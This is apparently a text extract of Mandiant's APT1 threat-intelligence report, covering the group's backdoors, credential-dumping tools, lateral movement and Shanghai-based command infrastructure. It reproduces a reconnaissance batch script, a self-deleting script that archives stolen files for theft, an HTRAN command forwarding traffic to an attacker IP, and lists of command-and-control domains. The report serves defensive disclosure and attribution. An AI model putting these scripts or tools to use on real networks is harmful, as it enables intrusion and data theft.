+Table 5: Backdoors that mimic legitimate communication protocols
+Backdoor
+
+Mimicked protocol
+
+MACROMAIL
+
+MSN Messenger
+
+GLOOXMAIL
+
+Jabber/XMPP
+
+CALENDAR
+
+Gmail Calendar
+
+When network defenders see the communications between these backdoors and their C2 servers, they might easily
+dismiss them as legitimate network traffic. Additionally, many of APT1’s backdoors use SSL encryption so that
+communications are hidden in an encrypted SSL tunnel. We have provided APT1’s public SSL certificates in Appendix
+F so people can incorporate them into their network signatures.
+
+Mandiant APT1
+
+33
+
+www.mandiant.com
+
+Privilege Escalation
+Escalating privileges involves acquiring items (most often usernames and passwords) that will allow access to more
+resources within the network. In this and the next two stages, APT1 does not differ significantly from other APT
+intruders (or intruders, generally). APT1 predominantly uses publicly available tools to dump password hashes from
+victim systems in order to obtain legitimate user credentials.
+APT1 has used these privilege escalation tools:
+Table 6: Publicly available privilege escalation tools that APT1 has used
+Tool
+
+Description
+
+Website
+
+cachedump
+
+This program extracts cached
+password hashes from a system’s
+registry
+
+Currently packaged with fgdump (below)
+
+fgdump
+
+Windows password hash dumper
+
+http://www.foofus.net/fizzgig/fgdump/
+
+gsecdump
+
+Obtains password hashes from the
+Windows registry, including the SAM
+file, cached domain credentials, and
+LSA secrets
+
+http://www.truesec.se
+
+lslsass
+
+Dump active logon session password
+hashes from the lsass process
+
+http://www.truesec.se
+
+mimikatz
+
+A utility primarily used for dumping
+password hashes
+
+http://blog.gentilkiwi.com/mimikatz
+
+pass-the-hash
+toolkit
+
+Allows an intruder to “pass” a
+password hash (without knowing the
+original password) to log in to systems
+
+http://oss.coresecurity.com/projects/pshtoolkit.htm
+
+pwdump7
+
+Dumps password hashes from the
+Windows registry
+
+http://www.tarasco.org/security/pwdump_7/
+
+pwdumpX
+
+Dumps password hashes from the
+Windows registry
+
+The tool claims its origin as http://reedarvin.thearvins.com/,
+but the site is not offering this software as of the date of this
+report
+
+Mandiant APT1
+
+34
+
+www.mandiant.com
+
+What is a password hash?
+When a person logs in to a computer, website, email server, or any networked resource requiring a password,
+the supplied password needs to be verified. One way to do this would be to store the person’s actual password
+on the system that the person is trying to access, and to compare the typed password to the stored password.
+Although simple, this method is also very insecure: anyone who can access that same system will be able to
+see the person’s password. Instead, systems that verify passwords usually store password hashes. In simple
+terms, a password hash is a number that is mathematically generated from the person’s password. The
+mathematical methods (algorithms) used to generate password hashes will create values that are unique for
+all practical purposes. When a person supplies their password, the computer generates a hash of the typed
+password and compares it to the stored hash. If they match, the passwords are presumed to be the same and
+the person is allowed to log in.
+It is supposed to be impossible to “reverse” a hash to obtain the original password. However, it is possible with
+enough computational resources to “crack” password hashes to discover the original password. (“Cracking”
+generally consists of guessing a large number of passwords, hashing them, and comparing the generated
+hashes to the existing hashes to see if any match.) Intruders will steal password hashes from victim systems
+in hopes that they can either use the hashes as-is (by “passing-the-hash”) or crack them to discover users’
+passwords.
+
+Internal Reconnaissance
+In the Internal Reconnaissance stage, the intruder collects information about the victim environment. Like most APT
+(and non-APT) intruders, APT1 primarily uses built-in operating system commands to explore a compromised system
+and its networked environment. Although they usually simply type these commands into a command shell, sometimes
+intruders may use batch scripts to speed up the process. Figure 18 below shows the contents of a batch script that
+APT1 used on at least four victim networks.
+@echo off
+ipconfig /all>>”C:\WINNT\Debug\1.txt”
+net start>>”C:\WINNT\Debug\1.txt”
+tasklist /v>>”C:\WINNT\Debug\1.txt”
+net user >>”C:\WINNT\Debug\1.txt”
+net localgroup administrators>>”C:\WINNT\Debug\1.txt”
+netstat -ano>>”C:\WINNT\Debug\1.txt”
+net use>>”C:\WINNT\Debug\1.txt”
+net view>>”C:\WINNT\Debug\1.txt”
+net view /domain>>”C:\WINNT\Debug\1.txt”
+net group /domain>>”C:\WINNT\Debug\1.txt”
+net group “domain users” /domain>>”C:\WINNT\Debug\1.txt”
+net group “domain admins” /domain>>”C:\WINNT\Debug\1.txt”
+net group “domain controllers” /domain>>”C:\WINNT\Debug\1.txt”
+net group “exchange domain servers” /domain>>”C:\WINNT\Debug\1.txt”
+net group “exchange servers” /domain>>”C:\WINNT\Debug\1.txt”
+net group “domain computers” /domain>>”C:\WINNT\Debug\1.txt”
+Figure 18: An APT1 batch script that automates reconnaissance
+
+Mandiant APT1
+
+35
+
+www.mandiant.com
+
+This script performs the following functions and saves the results to a text file:
+»»
+
+Display the victim’s network configuration information
+
+»»
+
+List the services that have started on the victim system
+
+»»
+
+List currently running processes
+
+»»
+
+List accounts on the system
+
+»»
+
+List accounts with administrator privileges
+
+»»
+
+List current network connections
+
+»»
+
+List currently connected network shares
+
+»»
+
+List other systems on the network
+
+»»
+
+List network computers and accounts according to group (“domain controllers,” “domain users,” “domain
+admins,” etc.)
+
+Lateral Movement
+Once an APT intruder has a foothold inside the network and a set of legitimate credentials,36 it is simple for the intruder
+to move around the network undetected:
+»»
+
+They can connect to shared resources on other systems
+
+»»
+
+They can execute commands on other systems using the publicly available “psexec” tool from Microsoft
+Sysinternals or the built-in Windows Task Scheduler (“at.exe”)
+
+These actions are hard to detect because legitimate system administrators also use these techniques to perform
+actions around the network.
+
+Maintain Presence
+In this stage, the intruder takes actions to ensure continued, long-term control over key systems in the network
+environment from outside of the network. APT1 does this in three ways.
+
+1. Install new backdoors on multiple systems
+Throughout their stay in the network (which could be years), APT1 usually installs new backdoors as they claim more
+systems in the environment. Then, if one backdoor is discovered and deleted, they still have other backdoors they can
+use. We usually detect multiple families of APT1 backdoors scattered around a victim network when APT1 has been
+present for more than a few weeks.
+
+2. Use legitimate VPN credentials
+APT actors and hackers in general are always looking for valid credentials in order to impersonate a legitimate user.
+We have observed APT1 using stolen usernames and passwords to log into victim networks’ VPNs when the VPNs are
+only protected by single-factor authentication. From there they are able to access whatever the impersonated users are
+allowed to access within the network.
+
+36
+
+Mandiant uses the term “credentials” to refer to a userid and its corresponding, working password.
+
+Mandiant APT1
+
+36
+
+www.mandiant.com
+
+3. Log in to web portals
+Once armed with stolen credentials, APT1 intruders also attempt to log into web portals that the network offers. This
+includes not only restricted websites, but also web-based email systems such as Outlook Web Access.
+
+Completing The Mission
+Similar to other APT groups we track, once APT1 finds files of interest they pack them into archive files before stealing
+them. APT intruders most commonly use the RAR archiving utility for this task and ensure that the archives are
+password protected. Sometimes APT1 intruders use batch scripts to assist them in the process, as depicted in Figure
+19. (The instances of “XXXXXXXX” obfuscate the text that was in the actual batch script.)
+@echo off
+cd /d c:\windows\tasks
+rar.log a XXXXXXXX.rar -v200m “C:\Documents and Settings\Place\My
+Documents\XXXXXXXX” -hpsmy123!@#
+del *.vbs
+del %0
+Figure 19: An APT1 batch script that bundles stolen files into RAR archive files
+After creating files compressed via RAR, the APT1 attackers will transfer files out of the network in ways that are
+consistent with other APT groups, including using the File Transfer Protocol (FTP) or their existing backdoors. Many
+times their RAR files are so large that the attacker splits them into chunks before transferring them. Figure 19 above
+shows a RAR command with the option “-v200m”, which means that the RAR file should be split up into 200MB
+portions.
+
+.rar
+
+Figure 20: APT1 bundles stolen files into RAR archives before moving data to China
+
+Mandiant APT1
+
+37
+
+www.mandiant.com
+
+Unlike most other APT groups we track, APT1 uses two email-stealing utilities that we believe are unique to APT1. The
+first, GETMAIL, was designed specifically to extract email messages, attachments, and folders from within Microsoft
+Outlook archive (“PST”) files.
+Microsoft Outlook archives can be large, often storing years’ worth of emails. They may be too large to transfer out
+of a network quickly, and the intruder may not be concerned about stealing every email. The GETMAIL utility allows
+APT1 intruders the flexibility to take only the emails between dates of their choice. In one case, we observed an APT1
+intruder return to a compromised system once a week for four weeks in a row to steal only the past week’s emails.
+Whereas GETMAIL steals email in Outlook archive files, the second utility, MAPIGET, was designed specifically to steal
+email that has not yet been archived and still resides on a Microsoft Exchange Server. In order to operate successfully,
+MAPIGET requires username/password combinations that the Exchange server will accept. MAPIGET extracts email
+from specified accounts into text files (for the email body) and separate attachments, if there are any.
+
+English As A Second Language
+APT1’s “It’s legit” email should not mislead someone into thinking that APT1 personnel are all fluent in English, though
+some undoubtedly are. Their own digital weapons betray the fact that they were programmed by people whose first
+language is not English. Here are some examples of grammatically incorrect phrases that have made it into APT1’s
+tools over the years.
+Table 7: Examples of grammatically incorrect phrases in APT1 malware
+Phrase
+
+Tool
+
+Compile date
+
+If use it, key is the KEY.
+
+GETMAIL
+
+2005-08-18
+
+Wether encrypt or not,Default is NOT.
+
+GETMAIL
+
+2005-08-18
+
+ToolHelp API isn’t support on NT versions prior to Windows 2000!
+
+LIGHTDART
+
+2006-08-03
+
+No Doubt to Hack You, Writed by UglyGorilla
+
+MANITSME
+
+2007-09-06
+
+Type command disable.Go on!
+
+HELAUTO
+
+2008-06-16
+
+File no exist.
+
+Simple Downloader
+(not profiled)
+
+2008-11-26
+
+you specify service name not in Svchost\netsvcs, must be one of following
+
+BISCUIT
+
+2009-06-02
+
+Can not found the PID
+
+WEBC2 (Uncat)
+
+2009-08-11
+
+Doesn’t started!
+
+GREENCAT
+
+2009-08-18
+
+Exception Catched
+
+MACROMAIL
+
+2010-03-15
+
+Are you sure to FORMAT Disk C With NTFS?(Y/N)
+
+TABMSGSQL
+
+2010-11-04
+
+Shell is not exist or stopped!
+
+TARSIP
+
+2011-03-24
+
+Reqfile not exist!
+
+COOKIEBAG
+
+2011-10-12
+
+the url no respon!
+
+COOKIEBAG
+
+2011-10-12
+
+Fail To Execute The Command
+
+WEBC2-TABLE
+
+2012-02-23
+
+Mandiant APT1
+
+38
+
+www.mandiant.com
+
+A P T 1 : I nfr a s t r u ct u r e
+APT1 maintains an extensive infrastructure of computers around the world. We have evidence suggesting that APT1
+manually controls thousands of systems in support of their attacks, and have directly observed their control over
+hundreds of these systems. Although they control systems in dozens of countries, their attacks originate from four large
+networks in Shanghai — two of which are allocated directly to the Pudong New Area, the home of Unit 61398. The
+sheer number of APT1 IP addresses concentrated in these Shanghai ranges, coupled with Simplified Chinese keyboard
+layout settings on APT1’s attack systems, betrays the true location and language of the operators. To help manage the
+vast number of systems they control, APT1 has registered hundreds of domain names, the majority of which also point
+to a Shanghai locale. The domain names and IP addresses together comprise APT1’s command and control framework
+which they manage in concert to camouflage their true origin from their English speaking targets.
+
+APT1 Network Origins
+We are frequently asked why it is an ineffective security measure to just block all IP addresses in China from
+connecting to your network. To put it simply, it is easy for APT1 attackers to bounce or “hop” through intermediary
+systems such that they almost never connect to a victim network directly from their systems in Shanghai. Using their
+immense infrastructure, they are able to make it appear to victims that an attack originates from almost any country
+they choose. The systems in this type of network redirection infrastructure have come to be called “hop points”
+or “hops.” Hop points are most frequently compromised systems that APT1 uses, in some instances for years, as
+camouflage for their attacks without the knowledge of the systems’ owners. These systems belong to third-party victims
+who are compromised for access to infrastructure, as opposed to direct victims who are compromised for their data
+and intellectual property.
+
+Figure 21: APT1 bounces through “hop point” systems before accessing victim systems
+
+Mandiant APT1
+
+39
+
+www.mandiant.com
+
+We have observed some of APT1’s activities after they cross into (virtual) U.S. territory. They access hop points using
+a variety of techniques, the most popular being Remote Desktop and FTP. Over a two-year period (January 2011 to
+January 2013) we confirmed 1,905 instances of APT1 actors logging into their hop infrastructure from 832 different
+IP addresses with Remote Desktop. Remote Desktop provides a remote user with an interactive graphical interface to
+a system. The experience is similar to the user actually physically sitting at the system and having direct access to the
+desktop, keyboard, and mouse. Of the 832 IP addresses, 817 (98.2%) were Chinese and belong predominantly to four
+large net blocks in Shanghai which we will refer to as APT1’s home networks.
+Table 8: Net blocks corresponding to IP addresses that APT1 used to access their hop points
+Number
+
+Net block
+
+Registered Owner
+
+445
+
+223.166.0.0 - 223.167.255.255
+
+China Unicom Shanghai Network
+
+217
+
+58.246.0.0 - 58.247.255.255
+
+China Unicom Shanghai Network
+
+114
+
+112.64.0.0 - 112.65.255.255
+
+China Unicom Shanghai Network
+
+12
+
+139.226.0.0 - 139.227.255.255
+
+China Unicom Shanghai Network
+
+1
+
+114.80.0.0 - 114.95.255.255
+
+China Telecom Shanghai Network
+
+1
+
+101.80.0.0 - 101.95.255.255
+
+China Telecom Shanghai Network
+
+27
+
+Other (non-Shanghai) Chinese IPs
+
+Notably, the registration information for the second and third net blocks above includes this contact information at the
+end:
+person:
+nic-hdl:
+e-mail:
+address:
+phone:
+fax-no:
+country:
+
+yanling ruan
+YR194-AP
+sh-ipmaster@chinaunicom.cn
+No.900,Pudong Avenue,ShangHai,China
++086-021-61201616
++086-021-61201616
+cn
+
+The registration information for these two net blocks suggests that they serve the Pudong New Area of Shanghai, where
+PLA Unit 61398 is headquartered.
+The other 15 of the 832 IP addresses are registered to organizations in the U.S. (12), Taiwan (1), Japan (1) and Korea
+(1). We have confirmed that some of these systems are part of APT1’s hop infrastructure and not legitimately owned
+by APT1 — in other words, APT1 accessed one hop from another hop, as opposed to accessing the hop directly from
+Shanghai.
+In order to make a user’s experience as seamless as possible, the Remote Desktop protocol requires client applications
+to forward several important details to the server, including their client hostname and the client keyboard layout.
+In 1,849 of the 1,905 (97%) APT1 Remote Desktop sessions we observed in the past two years, the keyboard
+layout setting was “Chinese (Simplified) — US Keyboard.” Microsoft’s Remote Desktop client configures this setting
+automatically based on the selected language on the client system, making it nearly certain that the APT1 actors
+managing the hop infrastructure are doing so with Simplified Chinese (zh-cn) input settings. “Simplified Chinese” is
+a streamlined set of the traditional Chinese characters that have been in use since the 1950s, originating in mainland
+China. Taiwan and municipalities such as Hong Kong still use “Traditional Chinese” (zh-tw) character sets.
+The overwhelming concentration of Shanghai IP addresses and Simplified Chinese language settings clearly indicate
+that APT1 intruders are mainland Chinese speakers with ready access to large networks in Shanghai. The only
+Mandiant APT1
+
+40
+
+www.mandiant.com
+
+alternative is that APT1 has intentionally been conducting a years-long deception campaign to impersonate Chinese
+speakers from Shanghai in places where victims are not reasonably expected to have any visibility – and without
+making a single mistake that might indicate their “true” identity.
+
+Interaction with Backdoors
+As we just mentioned, APT1 attackers typically use hops to connect to and control victim systems. Victim backdoors
+regularly connect out to hop points, waiting for the moment that the attacker is there to give them commands. However,
+exactly how this works is often specific to the tools they are using.
+
+Manual WEBC2 updates
+As covered in the previous “Attack Lifecycle” section, WEBC2 backdoor variants download and interpret data stored
+between tags in HTML pages as commands. They usually download HTML pages from a system within APT1’s hop
+infrastructure. We have observed APT1 intruders logging in to WEBC2 servers and manually editing the HTML pages
+that backdoors will download. Because the commands are usually encoded and difficult to spell from memory, APT1
+intruders typically do not type these strings, but instead copy and paste them into the HTML files. They likely generate
+the encoded commands on their own systems before pasting them in to an HTML file hosted by the hop point. For
+example, we observed an APT attacker pasting the string “czo1NA==” into an HTML page. That string is the base64encoded version of “s:54”, meaning “sleep for 54 minutes” (or hours, depending on the particular backdoor). In lieu
+of manually editing an HTML file on a hop point, we have also observed APT1 intruders uploading new (already-edited)
+HTML files.
+
+HTRAN
+When APT1 attackers are not using WEBC2, they require a “command and control” (C2) user interface so they can
+issue commands to the backdoor. This interface sometimes runs on their personal attack system, which is typically
+in Shanghai. In these instances, when a victim backdoor makes contact with a hop, the communications need to be
+forwarded from the hop to the intruder’s Shanghai system so the backdoor can talk to the C2 server software. We have
+observed 767 separate instances in which APT1 intruders used the publicly available “HUC Packet Transmit Tool”
+or HTRAN on a hop. As always, keep in mind that these uses are confirmed uses, and likely represent only a small
+fraction of APT1’s total activity.
+The HTRAN utility is merely a middle-man, facilitating connections between the victim and the attacker who is using
+the hop point.
+
+0101010001
+0100100001
+
+HTRAN
+
+0101010001
+
+C2
+
+0100100001
+
+Figure 22: The HTRAN tool resides on APT1 hop points and acts as a middle-man
+
+Mandiant APT1
+
+41
+
+www.mandiant.com
+
+Typical use of HTRAN is fairly simple: the attacker must specify the originating IP address (of his or her workstation in
+Shanghai), and a port on which to accept connections. For example, the following command, which was issued by an
+APT1 actor, will listen for incoming connections on port 443 on the hop and automatically proxy them to the Shanghai
+IP address 58.247.242.254 on port 443:
+htran -tran 443 58.247.242.254 443
+In the 767 observed uses of HTRAN, APT1 intruders supplied 614 distinct routable IP addresses. In other words, they
+used their hops to function as middlemen between victim systems and 614 different addresses. Of these addresses,
+613 of 614 are part of APT1’s home networks:
+Table 9: Net blocks corresponding to IP addresses used to receive HTRAN communications
+Number
+
+Net block
+
+Registered Owner
+
+340
+
+223.166.0.0 - 223.167.255.255
+
+China Unicom Shanghai Network
+
+160
+
+58.246.0.0 - 58.247.255.255
+
+China Unicom Shanghai Network
+
+102
+
+112.64.0.0 - 112.65.255.255
+
+China Unicom Shanghai Network
+
+11
+
+139.226.0.0 - 139.227.255.255
+
+China Unicom Shanghai Network
+
+1
+
+143.89.0.0 - 143.89.255.255
+
+Hong Kong University of Science and Technology
+
+C2 Server Software on Hop Infrastructure
+Occasionally, APT1 attackers have installed C2 server components on systems in their hop infrastructure rather than
+forwarding connections back to C2 servers in Shanghai. In these instances they do not need to use a proxy tool like
+HTRAN to interact with victim systems. However, it does mean that the intruders need to be able to interface with the
+(often graphical) C2 server software running on the hop. We have observed APT1 intruders log in to their hop point,
+start the C2 server, wait for incoming connections, and then proceed to give commands to victim systems.
+WEBC2 variants may include a server component that provides a simple C2 interface to the intruder. This saves the
+intruder from having to manually edit webpages. That is, this server component receives connections from victim
+backdoors, displays them to the intruder, and then translates the intruder’s commands into HTML tags that the victim
+backdoors read.
+
+Mandiant APT1
+
+42
+
+www.mandiant.com
+
+APT1 Servers
+In the last two years alone, we have confirmed 937 APT1 C2 servers — that is, actively listening or communicating
+programs — running on 849 distinct IP addresses. However, we have evidence to suggest that APT1 is running
+hundreds, and likely thousands, of other servers (see the Domains section below). The programs acting as APT1
+servers have mainly been: (1) FTP, for transferring files; (2) web, primarily for WEBC2; (3) RDP, for remote graphical
+control of a system; (4) HTRAN, for proxying; and (5) C2 servers associated with various backdoor families (covered in
+Appendix C: The Malware Arsenal).
+
+Global distribution of confirmed APT1 servers
+Taiwan (6)
+Canada (3)
+Australia (2)
+Mexico (2)
+Norway (2)
+Belgium (1)
+Denmark (1)
+Indonesia (1)
+India (1)
+Singapore (1)
+
+South Korea (11)
+US (109)
+
+China (709)
+
+Distribution of confirmed APT1 servers in China
+139.226.0.0 - 139.227.255.255: 19
+(Shanghai)
+
+Other: 11 (including 7 in Hong Kong)
+
+112.64.0.0 - 112.65.255.255: 93
+(Shanghai)
+
+58.246.0.0 - 58.247.255.255: 180
+(Shanghai)
+223.166.0.0 - 223.167.255.255: 406
+(Shanghai)
+
+Figure 23: The global distribution of confirmed APT1 servers
+Mandiant APT1
+
+43
+
+www.mandiant.com
+
+Domain Names
+The Domain Name System (DNS) is the phone book of the Internet. In the same way that people program named
+contacts into their cell phones and no longer need to remember phone numbers, DNS allows people to remember
+names like “google.com” instead of IP addresses. When a person types “google.com” into a web browser, a DNS
+translation to an IP address occurs so that the person’s computer can communicate with Google. Names that can be
+translated through DNS to IP addresses are referred to as Fully Qualified Domain Names (FQDNs).
+
+DNS QUERY
+1001100100011010100
+“Here’s the IP address”
+0101010001
+
+1001100100011
+
+ug-co.hugesoft.org
+0101010001
+
+1010010010100101
+
+0100100001
+
+0100100001
+
+C2
+Figure 24: DNS queries are used to resolve APT1 FQDNs to many C2 server IPs
+
+Mandiant APT1
+
+44
+
+www.mandiant.com
+
+2004
+
+APT1’s infrastructure includes FQDNs in addition
+to the IP addresses discussed above. The FQDNs
+play an important role in their intrusion campaigns
+because APT1 embeds FQDNs as C2 addresses
+within their backdoors. In the last several years
+we have confirmed 2,551 FQDNs attributed to
+APT1. Of these, we have redacted FQDNs that
+implicated victims by name and provided 2,046 in
+Appendix D. By using FQDNs rather than hardcoded IP addresses as C2 addresses, attackers
+may dynamically decide where to direct C2
+connections from a given backdoor. That is, if they
+lose control of a specific hop point (IP address)
+they can “point” the C2 FQDN address to a
+different IP address and resume their control over
+victim backdoors. This flexibility allows the attacker
+to direct victim systems to myriad C2 servers and
+avoid being blocked.
+
+APT1 Zone Registrations
+hugesoft.org
+2005
+
+ustvb.com
+uszzcs.com
+hvmetal.com
+hkcastte.com
+
+2006
+arrowservice.net
+blackcake.net
+businessconsults.net
+infosupports.com
+newsonet.net
+purpledaily.com
+2007
+
+avvmail.com
+shepmas.com
+syscation.com
+tibethome.org
+microsoft-update-info.com
+
+2008 busketball.com
+comrepair.net
+gmailboxes.com
+oplaymagzine.com
+maltempata.com
+nirvanaol.com
+2009 7 zones created
+cnndaily.com
+myyahoonews.com
+satellitebbs.com
+
+2010
+
+bpyoyo.com
+skyswim.net
+cslisten.com
+
+chileexe77.com
+issnbgkit.net
+progammerli.com
+idirectech.com
+livemymsn.com
+giftnews.org
+onefastgame.net
+conferencesinfo.com
+5 zones created
+
+6 zones created
+usnftc.org
+
+4 zones created
+micyuisyahooapis.com
+infobusinessus.org
+
+Registered Zones
+
+webservicesupdate.com
+
+ns06.net
+
+7 zones created
+nytimesnews.net
+cnnnewsdaily.com
+applesoftupdate.com
+
+APT1 FQDNs can be grouped into three categories:
+(1) registered zones, (2) third-party zones, and (3)
+hijacked domains.
+
+bigish.net
+
+cometoway.org
+
+copporationnews.com
+
+2012
+
+ifexcel.com
+
+msnhome.org
+usabbs.org
+
+6 zones created
+
+2011
+
+attnpower.com
+
+6 zones created
+phoenixtvus.com
+ushongkong.org
+newsesport.com
+youipcam.com
+olmusic100.com
+todayusa.org
+bluecoate.com
+
+The first zone we became aware of was “hugesoft.
+org”, which was registered through eNom,
+Inc. in October 2004. The registrant supplied
+“uglygorilla@163.com” as an email address. The
+supplied registration information, which is still
+visible in public “whois” data as of February 3,
+2013, includes the following:
+
+4 zones created
+bigdepression.net
+
+Mandiant APT1
+
+A DNS zone represents a collection of FQDNs that
+end with the same name, and which are usually
+registered through a domain registration company
+and controlled by a single owner. For example,
+“hugesoft.org” is an FQDN but also represents
+a zone. The FQDNs “ug-co.hugesoft.org” and
+“7cback.hugesoft.org” are part of the “hugesoft.
+org” zone and are called “subdomains” of the zone.
+The person who registered “hugesoft.org” may add
+as many subdomains as they wish and controls the
+IP resolutions of these FQDNs. APT1 has registered
+at least 107 zones since 2004. Within these zones,
+we know of thousands of FQDNs that have resolved
+to hundreds of IP addresses (which we suspect are
+hops) and in some instances to APT1’s source IP
+addresses in Shanghai.
+
+45
+
+www.mandiant.com
+
+Domain Name:HUGESOFT.ORG
+Created On:25-Oct-2004 09:46:18 UTC
+Registrant Name:huge soft
+Registrant Organization:hugesoft
+Registrant Street1:shanghai
+Registrant City:shanghai
+Registrant State/Province:S
+Registrant Postal Code:200001
+Registrant Country:CN
+Registrant Phone:+86.21000021
+Registrant Email:uglygorilla@163.com
+The supplied registrant information does not need to be accurate for the zone to be registered successfully. For
+example, “shanghai” is not a street name. Nevertheless, it is noteworthy that Shanghai appeared in the first known
+APT1 domain registration, along with a phone number that begins with China’s “+86” international code. In fact,
+Shanghai was listed as the registrant’s city in at least 24 of the 107 (22%) registrations. Compare this to the frequency
+with which other cities appeared in APT1 zone registration information:
+Table 10: Locations supplied in registration data other than Shanghai, China
+Number
+7
+5
+4
+4
+4
+3
+3
+3
+2
+2
+2
+2
+2
+2
+2
+1
+1
+1
+1
+1
+1
+1
+1
+1
+27
+
+Mandiant APT1
+
+City
+Beijing
+Calgary
+Guizhou
+Pasadena
+Houston
+Sydney
+Salt Lake
+Washington, DC
+Homewood
+Kalkaska
+Shallotte
+Yellow Spring
+New York
+Provo
+Shenzhen
+Birmingham
+Scottsdale
+Sunnyvale
+Albany
+Pearl River
+Chicago
+Moscow
+Nanning
+Wuhua
+Registration information blocked or not available
+
+46
+
+State
+CA
+TX
+UT
+AL
+MI
+NC
+OH
+NY
+UT
+AL
+AZ
+CA
+NY
+NY
+-
+
+Country
+China
+Canada
+China
+US
+US
+Australia
+US
+US
+US
+US
+US
+US
+US
+US
+China
+US
+US
+US
+US
+US
+US
+Guatemala
+China
+China
+
+www.mandiant.com
+
+Some of the supplied registration information is obviously false. For example, consider the registration information
+supplied for the zone “uszzcs.com” in 2005:
+Victor etejedaa@yahoo.com +86.8005439436
+Michael Murphy
+795 Livermore St.
+Yellow Spring,Ohio,UNITED STATES 45387
+Here, a phone number with a Chinese prefix (“+86”) accompanied an address in the United States. Since the United
+States uses the prefix “+1”, it is highly unlikely that a person living in Ohio would provide a phone number beginning
+with “+86”. Additionally, the city name is spelled incorrectly, as it should be “Yellow Springs” instead of “Yellow
+Spring”. This could have been attributed to a one-time spelling mistake, except the registrant spelled the city name
+incorrectly multiple times, both for the zones “uszzcs.com” and “attnpower.com”. This suggests that the registrant
+really thought “Yellow Spring” was the correct spelling and that he or she did not, in fact, live or work in Yellow Springs,
+Ohio.
+Overall, the combination of a relatively high number of “Shanghai” registrations with obviously false registration
+examples in other registrations suggests a partially uncoordinated domain registration campaign from 2004 until
+present, in which some registrants tried to fabricate non-Shanghai locations but others did not. This is supported by
+contextual information on the Internet for the email address “lfengg@163.com,” which was supplied in the registration
+information for seven of the 107 zones. On the site “www.china-one.org,” the email address “lfengg@163.com”
+appears as the contact for the Shanghai Kai Optical Information Technology Co., Ltd., a website production company
+located in a part of Shanghai that is across the river from PLA Unit 61398.
+
+Figure 25: An email address used to register APT1 zones is also a contact for a Shanghai company
+
+Mandiant APT1
+
+47
+
+www.mandiant.com
+
+Naming Themes
+About half of APT1’s known zones were named according to three themes: news, technology and business. These
+themes cause APT1 command and control addresses to appear benign at first glance. However, we believe that the
+hundreds of FQDNs within these zones were created for the purpose of APT1 intrusions. (Note: these themes are not
+unique to APT1 or even APT in general.)
+The news-themed zones include the names of well-known news media outlets such as CNN, Yahoo and Reuters.
+However, they also include names referencing English-speaking countries, such as “aunewsonline.com” (Australia),
+“canadatvsite.com” (Canada), and “todayusa.org” (U.S.). Below is a list of zones registered by APT1 that are newsthemed:
+aoldaily.com
+aunewsonline.com
+canadatvsite.com
+canoedaily.com
+cnndaily.com
+cnndaily.net
+cnnnewsdaily.com
+defenceonline.net
+freshreaders.net
+giftnews.org
+
+issnbgkit.net
+mediaxsds.net
+myyahoonews.com
+newsesport.com
+newsonet.net
+newsonlinesite.com
+newspappers.org
+nytimesnews.net
+oplaymagzine.com
+phoenixtvus.com
+
+purpledaily.com
+reutersnewsonline.com
+rssadvanced.org
+saltlakenews.org
+sportreadok.net
+todayusa.org
+usapappers.com
+usnewssite.com
+yahoodaily.com
+
+The technology-themed zones reference well-known technology companies (AOL, Apple, Google, Microsoft), antivirus
+vendors (McAfee, Symantec), and products (Blackberry, Bluecoat). APT1 also used more generic names referencing
+topics like software:
+aolon1ine.com
+applesoftupdate.com
+blackberrycluter.com
+bluecoate.com
+comrepair.net
+dnsweb.org
+downloadsite.me
+firefoxupdata.com
+
+globalowa.com
+gmailboxes.com
+hugesoft.org
+idirectech.com
+ifexcel.com
+infosupports.com
+livemymsn.com
+mcafeepaying.com
+
+microsoft-update-info.com
+micyuisyahooapis.com
+msnhome.org
+pcclubddk.net
+progammerli.com
+softsolutionbox.net
+symanteconline.net
+webservicesupdate.com
+
+Finally, some zones used by APT1 reflect a business theme. The names suggest websites that professionals might visit:
+advanbusiness.com
+businessconsults.net
+businessformars.com
+
+companyinfosite.com
+conferencesinfo.com
+copporationnews.com
+
+infobusinessus.org
+jobsadvanced.com
+
+Not every zone stays within APT1’s control forever. Over a campaign lasting for so many years, APT1 has not always
+renewed every zone in their attack infrastructure. Additionally, while some have simply been allowed to expire,
+others have been transferred to the organizations that the domain names attempted to imitate. For example, in
+September 2011, Yahoo filed a complaint against “zheng youjun” of “Arizona, USA”, who registered the APT1
+zone “myyahoonews.com”.37 Yahoo alleged the “<myyahoonews.com> domain name was confusingly similar to
+Complainant’s YAHOO! mark” and that “[zheng youjun] registered and used the <myyahoonews.com> domain name
+in bad faith.” In response, the National Arbitration Forum found that the site “myyahoonews.com” at the time resolved
+Yahoo! Inc. v. Zheng National Arbitration Forum Claim Number: FA1109001409001, (October 31, 2011) (Tyrus R. Atkinson, Jr., panelist), http://
+domains.adrforum.com/domains/decisions/1409001.htm, accessed February 6, 2013.
+37
+
+Mandiant APT1
+
+48
+
+www.mandiant.com
+
+
+United States: 559
+
+»»
+
+China: 263
+
+»»
+
+Taiwan: 25
+
+»»
+
+Korea: 22
+
+»»
+
+United Kingdom: 14
+
+»»
+
+Canada: 12
+
+43
+
+Sohu.com is a popular Chinese search engine, webmail, and Internet advertising company based out of Beijing China.
+
+44
+
+hxxp://tuziw.com/index.php?m=ta&id=1864863532
+
+Mandiant APT1
+
+58
+
+www.mandiant.com
+
+
+60
+
+www.mandiant.com
+
+
+Mandiant APT1
+
+66
+
+www.mandiant.com
+
+Mandiant APT1
+
+67
+
+www.mandiant.com
+
+
+www.mandiant.com
